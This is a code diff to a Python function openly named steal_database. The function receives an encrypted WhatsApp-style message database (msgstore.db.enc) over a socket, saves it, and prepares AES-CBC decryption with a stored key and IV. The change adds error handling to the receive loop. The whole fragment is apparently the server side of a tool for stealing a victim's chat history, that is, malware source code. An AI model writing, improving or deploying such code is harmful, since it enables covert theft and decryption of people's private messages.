@@ -31,12 +31,14 @@ def steal_database():
     with open("msgstore.db.enc", "wb") as db:
         database = conn.recv(8192)
         while database:
-            if count % 10:
-                print(count)
-            count +=1 
-            db.write(database)
-            database = conn.recv(8192)
-        db.write(database)
+            try:
+                if count % 10:
+                    print(count)
+                count +=1 
+                db.write(database)
+                database = conn.recv(8192)
+            except:
+                break
 
     obj = AES.new(bytes.fromhex(key), AES.MODE_CBC, bytes.fromhex(iv))
     print("Encrypted database has been received")
